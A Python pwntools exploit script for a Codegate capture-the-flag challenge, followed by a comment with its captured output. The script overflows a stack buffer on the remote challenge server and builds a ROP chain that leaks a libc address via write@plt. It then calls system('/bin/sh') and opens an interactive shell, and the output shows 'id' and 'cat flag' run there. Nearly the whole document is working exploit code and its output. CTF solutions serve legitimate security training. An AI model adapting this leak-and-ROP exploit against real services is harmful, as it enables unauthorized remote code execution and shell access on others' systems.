from pwn import *

r = remote("ch41l3ng3s.codegate.kr", 3131)

print r.recvuntil("1-3)")

payload = "100\x00"
payload += "A"*0x9c
payload += p64(0x100)
payload += "AAAA"
payload += p32(3)
payload += "B"*8

payload += p64(0x400bc3) # pop rdi ret
payload += p64(1)
payload += p64(0x400bc1) # pop rsi pop 15 ret
payload += p64(0x602060)
payload += p64(1)

payload += p64(0x40087c) # pop rdx ret
payload += p64(0x20)

payload += p64(0x4006d0) # write@plt

payload += p64(0x400a4b) # main

r.send(payload)

print r.recvuntil("rules")
rv = r.recvuntil("\x7f")[-6:]
rv = u64(rv + "\x00\x00")

print r.recvuntil("1-3)")
print "libc: " + hex(rv)

libc_base = rv - 0x6fe70
system = libc_base + 0x45390
binsh = libc_base + 0x18cd57

payload = "100\x00"
payload += "A"*0x9c
payload += p64(0x100)
payload += "AAAA"
payload += p32(3)
payload += "B"*8

payload += p64(0x400bc3) # pop rdi; ret
payload += p64(binsh) # binsh
payload += p64(system)

r.send(payload)

r.interactive()

'''
[*] Switching to interactive mode

100\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�\x00\x00\x00\x00\x00\x00AAAA\x03\x00\x00\x00BBBBBBBB�
             @\x00\x00\x00\x00\x00W\x98\x038\x7f\x00\x00\x90\x93\x83\x038\x7f\x00\x00
Don't break the rules...:( 
$ id
uid=1000(player) gid=1000(player) groups=1000(player)
$ 
$ cat flag
flag{The Korean name of "Puss in boots" is "My mom is an alien"}
$ 
'''
